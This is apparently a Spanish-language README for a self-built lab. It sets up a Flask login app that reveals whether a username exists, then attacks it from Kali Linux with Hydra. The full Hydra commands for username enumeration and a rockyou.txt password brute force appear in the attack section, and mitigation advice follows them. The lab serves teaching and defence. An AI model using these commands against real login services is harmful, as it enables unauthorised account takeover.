# Laboratorio Avanzado de Fuerza Bruta y Enumeración con Hydra

Este repositorio contiene el escenario y la guía práctica para recrear un ataque de fuerza bruta en entornos modernos, enfocado en la enumeración de usuarios debido a respuestas detalladas del servidor (*Verbose Bad Responses*) y la posterior explotación del servicio.

Este entorno fue diseñado y probado utilizando **UTM** en arquitectura **Apple Silicon (M1/M2/M3)** con máquinas virtuales de **Ubuntu 22.04 LTS (Víctima)** y **Kali Linux (Atacante)**.

---

## 🏗️ 1. Configuración del Entorno Víctima (Ubuntu)

El objetivo corre una aplicación web en Python (Flask) que simula un panel de administración interna. El sistema cuenta con una vulnerabilidad de diseño: responde de manera diferente si un usuario existe o no en la base de datos.

### Requisitos previos
Instalar los componentes de Python necesarios y abrir los puertos del Firewall del sistema:

```bash
sudo apt update
sudo apt install python3-pip python3-flask -y
sudo ufw allow 8080/tcp
```

**Código de la Aplicación** --> app.py

Desplegar el servicio ejecutando:

```bash
python3 app.py
```

### 🎯 2. Fase de Ataque (Kali Linux)

Preparación de Diccionarios.

Crear un listado de usuarios comunes a testear:

```bash
echo -e "juan\nadmin\npedro\nsoporte\ninvitado" > usuarios.txt
```

**Ataque A: Enumeración de Usuarios**

Aprovechando que el sistema devuelve "Usuario no encontrado", configuramos el flag de fallo de Hydra (F=) para identificar qué cuentas existen realmente en el servidor remoto.

```bash
hydra -L usuarios.txt -p claveCualquiera <IP_UBUNTU> -s 8080 http-post-form "/:user=^USER^&pass=^PASS^:F=Usuario no encontrado"
```

⚠️ *Nota Teórica*: Hydra reportará los usuarios válidos bajo la etiqueta valid passwords found. Esto ocurre porque Hydra interpreta cualquier respuesta que no contenga el string de fallo (F) como un acierto exitoso en la petición HTTP.

**Ataque B: Fuerza Bruta de Precisión**

Una vez identificados los usuarios válidos (admin, soporte), procedemos a realizar el ataque dirigido a la cuenta con mayor probabilidad de una contraseña débil (soporte), utilizando el diccionario nativo de Kali:

```bash
hydra -l soporte -P /usr/share/wordlists/rockyou.txt <IP_UBUNTU> -s 8080 http-post-form "/:user=^USER^&pass=^PASS^:F=incorrecta" -t 4 -V
```

🛡️ **Lecciones Aprendidas y Mitigación**

Mensajes de Error Genéricos: Las aplicaciones de autenticación jamás deben dar pistas de si el nombre de usuario existe. La respuesta correcta ante cualquier fallo debe ser genérica (ej: "Usuario o contraseña incorrectos").

Defensa Perimetral: Herramientas automatizadas como Hydra generan cientos de peticiones por segundo. La implementación de software como Fail2Ban o el bloqueo temporal de cuentas tras 3 intentos fallidos mitiga por completo este vector de ataque.